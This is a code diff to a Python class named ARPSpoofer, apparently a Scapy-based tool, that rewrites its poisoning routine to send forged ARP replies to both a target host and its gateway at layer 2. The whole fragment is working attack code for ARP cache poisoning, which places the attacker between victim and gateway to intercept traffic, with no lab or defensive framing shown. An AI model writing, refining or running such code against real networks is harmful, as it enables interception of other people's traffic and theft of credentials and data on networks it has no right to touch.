@@ -61,30 +61,25 @@ class ARPSpoofer:
 
     def _spoof(self):
         """Send ARP poison packets to target and gateway"""
-
         # Create poisoned ARP reply for target
-        # This tells the target that WE are the gateway
-        target_poison = ARP(
+        target_poison = Ether(dst=self.target_mac)/ARP(
             op=2,  # ARP reply
-            pdst=self.target_ip,  # Destination IP (target)
-            hwdst=self.target_mac,  # Destination MAC (target)
-            psrc=self.gateway_ip,  # We claim to be the gateway
-            hwsrc=self.attacker_mac  # But with OUR MAC address B))
+            psrc=self.gateway_ip,
+            hwsrc=self.attacker_mac,
+            pdst=self.target_ip
         )
-
+        
         # Create poisoned ARP reply for gateway
-        # This tells the gateway that WE are the target
-        gateway_poison = ARP(
+        gateway_poison = Ether(dst=self.gateway_mac)/ARP(
             op=2,  # ARP reply
-            pdst=self.gateway_ip,  # Destination IP (gateway)
-            hwdst=self.gateway_mac,  # Destination MAC (gateway)
-            psrc=self.target_ip,  # We claim to be the target
-            hwsrc=self.attacker_mac  # But with OUR MAC address B))
+            psrc=self.target_ip,
+            hwsrc=self.attacker_mac,
+            pdst=self.gateway_ip
         )
+        
+        # Send with sendp() for layer 2
+        sendp([target_poison, gateway_poison], verbose=0, iface=self.interface)
 
-        # Send the poisoned packets
-        send(target_poison, verbose=0, iface=self.interface)
-        send(gateway_poison, verbose=0, iface=self.interface)
 
         logger.debug(f"Sent ARP poison packets")
 
